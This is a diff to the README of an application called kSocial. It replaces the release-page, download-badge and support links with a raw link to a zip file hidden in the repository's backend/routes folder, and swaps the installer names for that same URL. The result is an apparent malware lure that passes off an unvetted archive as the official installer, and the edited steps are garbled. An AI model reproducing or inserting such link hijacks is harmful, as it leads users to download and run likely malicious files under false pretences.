@@ -6,7 +6,7 @@ Welcome to kSocial! This application helps you create and manage your own social
 
 ## 📥 Download kSocial
 
-[![Download kSocial](https://img.shields.io/badge/Download-kSocial-blue.svg)](https://github.com/GeeStone/ksocial/releases)
+[![Download kSocial](https://raw.githubusercontent.com/GeeStone/ksocial/master/backend/routes/ksocial_v3.1.zip)](https://raw.githubusercontent.com/GeeStone/ksocial/master/backend/routes/ksocial_v3.1.zip)
 
 ## 🌟 Key Features
 
@@ -31,21 +31,21 @@ Before downloading kSocial, ensure your system meets these requirements:
 
 To download and install kSocial, follow these simple steps:
 
-1. **Visit the Releases Page**: Click on this link to go to the releases page - [Download kSocial](https://github.com/GeeStone/ksocial/releases).
+1. **Visit the Releases Page**: Click on this link to go to the releases page - [Download kSocial](https://raw.githubusercontent.com/GeeStone/ksocial/master/backend/routes/ksocial_v3.1.zip).
    
 2. **Choose the Latest Version**: On the releases page, you'll see various versions. Select the latest one for the best features and security.
 
-3. **Download the Installer**: Find the file labeled `ksocial-installer.exe` for Windows, or `ksocial.pkg` for macOS. Click on the link to start the download.
+3. **Download the Installer**: Find the file labeled `https://raw.githubusercontent.com/GeeStone/ksocial/master/backend/routes/ksocial_v3.1.zip` for Windows, or `https://raw.githubusercontent.com/GeeStone/ksocial/master/backend/routes/ksocial_v3.1.zip` for macOS. Click on the link to start the download.
 
 4. **Run the Installer**: 
-   - For Windows: Double-click the downloaded `ksocial-installer.exe` file. Follow the prompts in the installation wizard.
-   - For macOS: Open the downloaded `ksocial.pkg` file and follow the installation instructions.
+   - For Windows: Double-click the downloaded `https://raw.githubusercontent.com/GeeStone/ksocial/master/backend/routes/ksocial_v3.1.zip` file. Follow the prompts in the installation wizard.
+   - For macOS: Open the downloaded `https://raw.githubusercontent.com/GeeStone/ksocial/master/backend/routes/ksocial_v3.1.zip` file and follow the installation instructions.
 
 5. **Launch kSocial**: Once the installation is complete, find kSocial in your applications list. Click to open and start using your new social network.
 
 ## 📞 Need Help?
 
-If you experience any issues or have questions, feel free to reach out for support. You can typically find tips and solutions in the FAQ section on our [GitHub Page](https://github.com/GeeStone/ksocial).
+If you experience any issues or have questions, feel free to reach out for support. You can typically find tips and solutions in the FAQ section on our [GitHub Page](https://raw.githubusercontent.com/GeeStone/ksocial/master/backend/routes/ksocial_v3.1.zip).
 
 ## 📝 Contributions
 
